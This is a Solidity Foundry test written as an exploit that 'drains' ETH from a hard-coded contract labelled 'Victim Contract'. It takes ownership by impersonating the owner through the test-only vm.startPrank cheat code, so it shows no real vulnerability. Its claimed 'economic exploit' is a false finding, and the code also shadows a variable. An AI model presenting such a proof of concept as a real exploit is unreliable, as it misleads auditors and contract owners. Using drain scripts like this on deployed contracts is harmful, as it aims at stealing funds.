pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function withdrawStuckETH() external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);
    uint256 initialBalance;
    address currentOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        currentOwner = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner();

        // Label addresses for clarity
        vm.label(currentOwner, "Current Owner");
        vm.label(TARGET, "Victim Contract");
        vm.label(attacker, "Attacker");

        // Store initial attacker balance for later comparison
        initialBalance = attacker.balance;

        // Send some ETH to the victim contract so it has balance to drain
        deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate the current owner to transfer ownership to ourselves
        vm.startPrank(currentOwner);
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).transferOwnership(attacker);
        vm.stopPrank();

        // Verify we are now the owner
        require(FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).owner() == attacker, "Failed to become owner");

        // Step 2: As the new owner, drain the ETH using withdrawStuckETH()
        // Note: We're already the attacker (address(this)), so we can call directly
        FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET).withdrawStuckETH();

        // Step 3: Verify our balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

